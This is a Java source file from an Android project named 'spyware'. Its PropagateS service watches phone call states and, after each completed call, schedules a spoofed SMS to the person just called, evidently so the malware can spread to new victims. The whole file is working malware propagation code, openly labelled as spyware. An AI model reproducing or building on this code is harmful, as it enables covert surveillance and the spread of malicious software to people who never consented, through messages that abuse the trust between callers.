package android.spyware;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.Calendar;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;
import static android.spyware.Spyware.TIMER;

/**
 * This service runs in the background and waits for a call to end.
 * Once a call ends, it sets an alarm to send an SMS to the person the user
 * just spoke with in TIMER minute.
 */
public class PropagateS extends Service {
    private static int prevState = 0;
    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();

        if (DEV_MODE)
            Log.i(TAG, "::INF  Propagate service running...");

        context = getApplication();

        TelephonyManager mTelephonyMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        PhoneStateListener listener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        Log.d(TAG, "::DEB  Incoming call from " + incomingNumber);
                        prevState = state;
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.d(TAG, "::DEB  On the call...");
                        prevState = state;
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:
                        if (prevState == TelephonyManager.CALL_STATE_OFFHOOK) {
                            Log.d(TAG, "::DEB  Call just ended.");
                            prevState = state;
                            setAlarm();
                        } else if (prevState == TelephonyManager.CALL_STATE_RINGING) {
                            Log.d(TAG, "::DEB  Call missed or rejected.");
                            prevState = state;
                        }

                        break;
                }
            }
        };

        mTelephonyMgr.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    // Send a SMS to the person the user just talked with in TIMER minute.
    private void setAlarm() {
        Calendar nextAlarm = Calendar.getInstance();
        nextAlarm.add(Calendar.MINUTE, TIMER);

        Intent intent = new Intent(context, SpoofSMSR.class);
        PendingIntent pIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        AlarmManager am = (AlarmManager) context.getSystemService(Activity.ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, nextAlarm.getTimeInMillis(), pIntent);

        if (DEV_MODE) {
            Log.i(TAG, "::INF  SpoofSMS alarm set for: " + nextAlarm.get(Calendar.HOUR) + ":"
                    + nextAlarm.get(Calendar.MINUTE));
        }
    }

    @Override
    public void onDestroy() {
        if (DEV_MODE)
            Log.i(TAG, "::INF  Propagate service terminated.");
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
}
